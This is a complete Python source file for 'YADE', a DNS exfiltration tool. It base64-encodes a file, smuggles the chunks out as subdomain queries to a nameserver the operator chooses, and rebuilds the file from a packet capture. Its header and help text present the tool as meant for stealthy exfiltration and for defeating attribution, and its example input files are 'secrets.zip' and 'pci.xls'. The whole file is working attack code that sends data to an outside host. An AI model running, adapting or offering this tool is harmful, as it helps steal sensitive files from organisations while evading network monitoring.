#!/usr/bin/env python3
#
# Filename:  yade.py 
#
# Version: 1.0.0
#
# Author:  Andrew Herd 
# 
# Summary:  YADE encodes the file's contents and sends the data through 
# DNS queries to exfiltrate / transfer data to any system that is able to
# capture a copy of the DNS queries. The captured pcap can then be loaded
# into yade.py, which then extracts the encoded queries and the payload
#
# Primary use cases are defeating attribution (no direct connection to an
# attacker-controlled destination is ever required) and stealthy exfiltration
# when all other services are unavailable.
# 
# As a quick test, run YADE from a VM, then send a file while doing a
# packet capture on the VM's network interface via the host system. You
# can then load the PCAP file into whichever YADE instance is convenient
# to decode the file. Just remember it's not a speedy transfer. Smaller
# files and patience are your friend.
# 
# Example:  
#
#   $ python3 yade.py 
#   $ ./yade.py



import io, base64, sys, time, random, re
import dns.resolver 
from scapy.all import *

def printBanner():
	print("-------------------------------------------")
	print("       YET ANOTHER DNS EXFILTRATION       ")
	print("_____.___.  _____  ________  ___________")
	print(" \__  |   | /  _  \ \______ \ \_   _____/ ")
	print("  /   |   |/  /_\  \ |    |  \ |    __)_ ")
	print("  \____   /    |    \|    `   \|        \ ")
	print("  / ______\____|__  /_______  /_______  /")
	print("  \/              \/        \/        \/  ")  
	print("       YET ANOTHER DNS EXFILTRATION       ")
	print("-------------------------------------------")
	return


def sendFile(dnsIpAddress, fileName, recordLookup, domainName):
    # open file to send and base64 encode the contents
    try:
        data = open(fileName, "r").read()
    except:
        print("[-] FILE NOT FOUND")
        return

    encoded = base64.b64encode(data.encode('ascii'))
    base64_message = encoded.decode('ascii')

    # set the IP Address of the receiver machine
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [dnsIpAddress]

    # set custom domain to search for
    domainName = "." + domainName
    preName = ""

    # break up encoded data into chunks for the subdomain in a DNS request
    print("\n Following DNS Requests were made for: \n")
    rem = 0
    for element in range(0, len(base64_message)):
        preName += base64_message[element]    
        if(len(preName) == 63):
            fullName = "{0}{1}".format(preName, domainName)
            print(fullName)
            try:
                if ( recordLookup == 'MIXXX'):
                    # all netowrk types by value for scapy
                    types = ['ANY', 'ALL', 'A', 'NS', 'MD', 'MD', 'CNAME', 'SOA', 'MB', 'MG'
                             , 'MR', 'NULL', 'WKS', 'PTR', 'HINFO', 'MINFO', 'MX', 'TXT', 'RP'
                             , 'AFSDB', 'AAAA', 'SRV', 'A6', 'DNAME']
                    random_choice = random.choice(types)
                    result = resolver.resolve(fullName, random_choice)
                else:
                    result = resolver.resolve(fullName, recordLookup)
            except:
                print("\n DNS REQUEST WAS NOT RESOLVED \n")
            preName = ""

    # check if there is anything left to send
    if(len(preName) != 0):
        fullName = "{0}{1}".format(preName, domainName)
        print(fullName)
        try:
            if ( recordLookup == 'MIXXX'):
                # all netowrk types by value for scapy
                types = ['ANY', 'ALL', 'A', 'NS', 'MD', 'MD', 'CNAME', 'SOA', 'MB', 'MG'
                        , 'MR', 'NULL', 'WKS', 'PTR', 'HINFO', 'MINFO', 'MX', 'TXT', 'RP'
                        , 'AFSDB', 'AAAA', 'SRV', 'A6', 'DNAME']
                random_choice = random.choice(types)
                result = resolver.resolve(fullName, random_choice)
            else:
                result = resolver.resolve(fullName, recordLookup)
            preName = ""
        except:
            print("\n DNS REQUEST WAS NOT RESOLVED \n") 
        preName = ""

def fileTransferOptions():

	print("\n====  Prep For DNS Transfer ====\n")
	notDone = True

	while ( notDone ):

		dnsIpAddress = input("Enter IP Address for Receiving DNS Requests: ")
		if ( not bool(re.match(r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", dnsIpAddress)) ):
			notDone = True
			print("\n!!! Destination IP Address required, try again.\n")
		else:
			notDone = False
			
	notDone = True
	while ( notDone ):

		domainName = input("Enter Custom Domain Name (e.g. technoherder.com): ")
		if ( domainName == "" ):
			notDone = True
			print("\n!!! Domain Name required, try again.\n")
		else:
			notDone = False
			
	notDone = True
	while ( notDone ):
                
		selectionErrorMsg = "1-8 are your options. Try again.\n"
                
# Full List of RdataType from dnspython
# Feel free to modify for custom cases
# TYPE0 = RdataType.TYPE0
# NONE = RdataType.NONE
# A = RdataType.A
# NS = RdataType.NS
# MD = RdataType.MD
# MF = RdataType.MF
# CNAME = RdataType.CNAME
# SOA = RdataType.SOA
# MB = RdataType.MB
# MG = RdataType.MG
# MR = RdataType.MR
# NULL = RdataType.NULL
# WKS = RdataType.WKS
# PTR = RdataType.PTR
# HINFO = RdataType.HINFO
# MINFO = RdataType.MINFO
# MX = RdataType.MX
# TXT = RdataType.TXT
# RP = RdataType.RP
# AFSDB = RdataType.AFSDB
# X25 = RdataType.X25
# ISDN = RdataType.ISDN
# RT = RdataType.RT
# NSAP = RdataType.NSAP
# NSAP_PTR = RdataType.NSAP_PTR
# SIG = RdataType.SIG
# KEY = RdataType.KEY
# PX = RdataType.PX
# GPOS = RdataType.GPOS
# AAAA = RdataType.AAAA
# LOC = RdataType.LOC
# NXT = RdataType.NXT
# SRV = RdataType.SRV
# NAPTR = RdataType.NAPTR
# KX = RdataType.KX
# CERT = RdataType.CERT
# A6 = RdataType.A6
# DNAME = RdataType.DNAME
# OPT = RdataType.OPT
# APL = RdataType.APL
# DS = RdataType.DS
# SSHFP = RdataType.SSHFP
# IPSECKEY = RdataType.IPSECKEY
# RRSIG = RdataType.RRSIG
# NSEC = RdataType.NSEC
# DNSKEY = RdataType.DNSKEY
# DHCID = RdataType.DHCID
# NSEC3 = RdataType.NSEC3
# NSEC3PARAM = RdataType.NSEC3PARAM
# TLSA = RdataType.TLSA
# SMIMEA = RdataType.SMIMEA
# HIP = RdataType.HIP
# NINFO = RdataType.NINFO
# CDS = RdataType.CDS
# CDNSKEY = RdataType.CDNSKEY
# OPENPGPKEY = RdataType.OPENPGPKEY
# CSYNC = RdataType.CSYNC
# ZONEMD = RdataType.ZONEMD
# SVCB = RdataType.SVCB
# HTTPS = RdataType.HTTPS
# SPF = RdataType.SPF
# UNSPEC = RdataType.UNSPEC
# NID = RdataType.NID
# L32 = RdataType.L32
# L64 = RdataType.L64
# LP = RdataType.LP
# EUI48 = RdataType.EUI48
# EUI64 = RdataType.EUI64
# TKEY = RdataType.TKEY
# TSIG = RdataType.TSIG
# IXFR = RdataType.IXFR
# AXFR = RdataType.AXFR
# MAILB = RdataType.MAILB
# MAILA = RdataType.MAILA
# ANY = RdataType.ANY
# URI = RdataType.URI
# CAA = RdataType.CAA
# AVC = RdataType.AVC
# AMTRELAY = RdataType.AMTRELAY
# TA = RdataType.TA
# DLV = RdataType.DLV

		print("Please select a DNS request method for usage:")
		print("1) 'A' Record'")
		print("2) 'AAAA' Record'")
		print("3) CNAME")
		print("4) MX")
		print("5) NS")
		print("6) SOA")
		print("7) TXT")
		print("8) Mix it up!!!\n")
	
		invalidSelection = 1
	
		while ( invalidSelection ):
			try:
				choice = int( input( "Selection: " ))
	
				if ( choice > 0 and choice < 9 ):
					invalidSelection = 0
					notDone = False
				else:
					print(selectionErrorMsg)
	
			except ValueError:
				print(selectionErrorMsg)
				
		if choice == 1:
			recordLookup = 'A'
		elif choice == 2:
			recordLookup = 'AAAA'
		elif choice == 3:
			recordLookup = 'CNAME'
		elif choice == 4:
			recordLookup = 'MX'
		elif choice == 5:
			recordLookup = 'NS'
		elif choice == 6:
			recordLookup = 'SOA'
		elif choice == 7:
			recordLookup = 'TXT'
		elif choice == 8:
			recordLookup = 'MIXXX'
		else:
			print(selectionErrorMsg)
			
	notDone = True
	while ( notDone ):

		sourceFile = input("Enter filename (e.g. secrets.zip or pci.xls): ")
		if ( sourceFile == "" ):
			notDone = True
			print("\n!!! Filename required, try again.\n")
		else:
			notDone = False

	print("\n[+] IP Address for Receiving DNS Requests: %s", dnsIpAddress)
	print("[+] Transferring File Name: %s", sourceFile)	
	return(sendFile(dnsIpAddress, sourceFile, recordLookup, domainName))

def decodeFile(fileName, domainName):

    content = ""
    # open pcap file
    try:
        dns_packets = rdpcap(fileName)
    except:
        print("[-] FILE NOT FOUND OR FILE IS NOT PCAP")
        return    

    # filter to only DNS requests and grab the qualified domain name
    for packet in dns_packets:
        if packet.haslayer(DNS):
            try:
                query = packet[DNSQR].qname.decode()
                content += query + "\n"
            except:
                query = ""

    # filter to only the custom domain
    filtered = ""
    for line in io.StringIO(content):
        if domainName in line:
            filtered += line

    # extract and concatenate encoded data
    base64_message = ""
    count = 1
    fat = len(domainName) + 3
    for line in io.StringIO(filtered):
        if( count == 6):
            line = line[:-fat]
            base64_message += line
            count = 0
        count += 1

    try:
        # decode and print file contents
        base64_bytes = base64_message.encode('ascii')
        message_bytes = base64.b64decode(base64_bytes)
        message = message_bytes.decode('ascii')

        print("[+] File contents have been extracted\n")

        notDone = True

        while ( notDone ):

            newFile = input("Enter new filename (e.g. secrets.zip or pci.xls): ")
            if ( newFile == "" ):
                notDone = True
                print("\n!!! Filename required, try again.\n")
            else:
                notDone = False

        f = open(newFile,"w+")
        f.write(message)
        f.close()

        print("\n[+] File contents have been saved to: ", newFile)
        print("")


    except:
        print("[-] There was an error decoding the file contents")


def extractOptions():

    print("\n====  Extract from DNS Transfer ====\n")
    notDone = True

    while ( notDone ):
        sourceFile = input("Enter PCAP filename (e.g. secrets.pcap): ")
        if ( sourceFile == "" ):
            notDone = True
            print("\n!!! PCAP Filename required, try again.\n")
        else:
            notDone = False
			
    notDone = True
    while ( notDone ):

        domainName = input("Enter Custom Domain Name (e.g. technoherder.com): ")
        if ( domainName == "" ):
            notDone = True
            print("\n!!! Domain Name required, try again.\n")
        else:
            notDone = False

    print("\n[+] Extracting from PCAP File: %s", sourceFile)	

    return(decodeFile(sourceFile, domainName))


#========================================================================
#
# help()
#
# Mostly a rehash of the other documentation, but always nice to have it
# handy within the tool while you're running it.
#
#========================================================================

def help():

	printBanner()
	print("\n\n\n=====================  Using YADE  =====================\n")
	print("Summary:  YADE encodes the file's contents and sends the data through ")
	print("DNS queries to exfiltrate / transfer data to any system that is able to") 
	print("capture a copy of the DNS queries. The captured pcap can then be loaded")
	print("into yade.py, which then extracts the encoded queries and the payload.\n")
	print("Primary use cases are defeating attribution (no direct connection to an")
	print("attacker-controlled destination is ever required) and stealthy exfiltration")
	print("when all other services are unavailable.")
    
	print("\nAs a quick test, run YADE from a VM, then send a file while doing a")
	print("packet capture on the VM's network interface via the host system. You")
	print("can then load the PCAP file into whichever YADE instance is convenient")
	print("to decode the file. Just remember it's not a speedy transfer. Smaller")
	print("files and patience are your friend.")
    
	print("\nDescription:")
	print("YADE generates seqential DNS queries for each FQDN, which propagates the")
	print("DNS query along the DNS resolution path.")
	
	print("\nTo capture the data, you just need visibility of the network traffic along")
	print("the DNS resolution path, which can be as simple as a connected system")
	print("capturing in promiscuous mode (wifi), IoT devices, or access to network")
	print("appliances along the DNS query path, including external to the organization")
	print("of origination.")
     
	print("\nThe captured pcap file is then loaded into YADE on whatever system")
	print("is convenient. It then parses the pcap file using the matching custom domain")
	print("used to encode during transmission. The ciphered data is extracted from the")
	print("pcap and then decrypted and printed.")
     
	print("\n=====  NOTE: VPNs Will Prevent Access To DNS Queries  =====")
	print("\nIf the transmitting system is using a VPN, then none of the DNS queries")
	print("will be available unless your point of capture is upstream from the VPN")
	print("exit node. That's obvious, but it also means if you're testing on your")
	print("own system and running a VPN, you'll be capturing an empty PCAP file.")
	print("Always verify your PCAP capture settings and outputs.")
	
	print("\n=====  NOTE: NOT A HIGH-BANDWIDTH TRANSFER METHOD  =====\n")
	print("Not a high-bandwidth transfer method. YADE relies on DNS queries,")
	print("which are UDP-based, meaning order of delivery (or even successful delivery)")
	print("of the request is not guranteed. For this reason, YADE by default")
	print("adds a small delay between each unique DNS query.")
    
	print("\n=====  NOTE: NOT A SECURE ENCRYPTION SCHEME  =====\n")
	print("YADE is not using a secure encryption scheme. It is vulnerable to")
	print("analysis attacks. If payload secrecy is required, be sure to encrypt")
	print("the payload before using YADE to process it.")
	
	print("\n=====  NOTE: DNS IS DNS  =====\n")	
	print("Different OS's have different DNS caching policies, etc. Networks may be")
	print("down, isolated, etc. YADE includes a quick manual check to see if")
	print("it can resolve common FQDNs, but DNS is often a messy business. Remember")
	print("the old IT troubleshooting mantra: 'It's always DNS.'")

	return()

def MainMenu():

	selectionErrorMsg = "1-4 are your options. Try again.\n"
	notDone = 1

	while ( notDone ): 

		print("\n====  YADE Main Menu  ====\n")
		print("1) Transmit File via DNS")
		print("2) Extract File from PCAP")
		print("3) Help / About")
		print("4) Exit\n")
	
		invalidSelection = 1
	
		while ( invalidSelection ):
			try:
				choice = int( input( "Selection: " ))
	
				if ( choice > 0 and choice < 5 ):
					invalidSelection = 0
				else:
					print(selectionErrorMsg)
	
			except ValueError:
				print(selectionErrorMsg)
				
		if choice == 1:
			print("Cloak and Transfer")
			fileTransferOptions()
		elif choice == 2:
			print("Extract Captured Payload")
			extractOptions()
		elif choice == 3:
			help()
		elif choice == 4:
			notDone = False
		else:
			print(selectionErrorMsg)

    	
	# Wherever you are on this floating space orb we call home, I hope you are well
	byeArray = ("Bye!", "Ciao!", "Adios!", "Aloha!", "Hei hei!", "Bless bless!", "Hej da!", "Tschuss!", "Adieu!", "Cheers!")
	print("\n")
	print(random.choice( byeArray ))
	print("\n")
	return

if __name__ == "__main__":
   if len(sys.argv) != 1:
       print("(+) usage: %s " % sys.argv[0])
       sys.exit(-1)

   printBanner()
   # ==============================  Main Loop  ================================
   #
   try:
    MainMenu()
   except KeyboardInterrupt:
       print("\nGoodbye!")
       quit()
   
       